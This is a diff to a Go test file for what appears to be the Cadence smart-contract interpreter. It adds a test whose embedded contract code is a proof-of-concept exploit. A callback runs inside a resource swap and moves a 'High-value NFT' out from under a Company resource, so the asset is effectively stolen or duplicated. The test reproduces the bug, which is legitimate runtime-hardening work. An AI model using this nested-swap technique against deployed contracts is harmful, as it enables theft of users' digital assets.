@@ -19,6 +19,7 @@
 package interpreter_test
 
 import (
+	"fmt"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -3427,4 +3428,89 @@ func TestInterpretResourceLoss(t *testing.T) {
 	_, err = inter.Invoke("main")
 	RequireError(t, err)
 	require.ErrorAs(t, err, &interpreter.ResourceLossError{})
+}
+
+func TestInterpretNestedSwap(t *testing.T) {
+
+	t.Parallel()
+
+	inter, getLogs, err := parseCheckAndInterpretWithLogs(t, `
+        access(all) resource NFT {
+            access(all) var name: String
+            init(name: String) {
+                self.name = name
+            }
+        }
+
+        access(all) resource Company {
+            access(self) var equity: @[NFT]
+
+            init(incorporationEquityCollection: @[NFT]) {
+                pre {
+                    // We make sure the incorporation collection has at least one high-value NFT
+                    incorporationEquityCollection[0].name == "High-value NFT"
+                }
+                self.equity <- incorporationEquityCollection
+            }
+
+            access(all) fun logContents() {
+                log("Current contents of the Company (should have a High-value NFT):")
+                log(self.equity[0].name)
+            }
+
+            destroy() {
+                destroy self.equity
+            }
+        }
+
+        access(all) resource SleightOfHand {
+            access(all) var arr: @[NFT];
+            access(all) var company: @Company?
+            access(all) var trashNFT: @NFT
+
+            init() {
+                self.arr <- [ <- create NFT(name: "High-value NFT")]
+                self.company <- nil
+                self.trashNFT <- create NFT(name: "Trash NFT")
+                self.doMagic()
+            }
+
+            access(all) fun callback(): Int {
+                var x: @[NFT] <- []
+                self.arr <-> x
+                // We hand over the array to the Company object after the swap
+                // has already been "scheduled"
+                self.company <-! create Company(incorporationEquityCollection: <- x)
+                return 0
+            }
+
+            access(all) fun doMagic() {
+                // Start a swap and trigger callback at the last possible moment 
+                self.trashNFT <-> self.arr[self.callback()]
+                self.company?.logContents()
+                log("Look what I pickpocketd:")
+                log(self.trashNFT.name)
+            }
+
+            destroy() {
+                destroy self.arr
+                destroy self.company
+                destroy self.trashNFT
+            }
+        }
+
+        access(all) fun main() {
+            let a <- create SleightOfHand()
+            destroy a
+        }
+    `)
+
+	require.NoError(t, err)
+
+	_, err = inter.Invoke("main")
+	require.NoError(t, err)
+
+	for _, log := range getLogs() {
+		fmt.Println(log)
+	}
 }
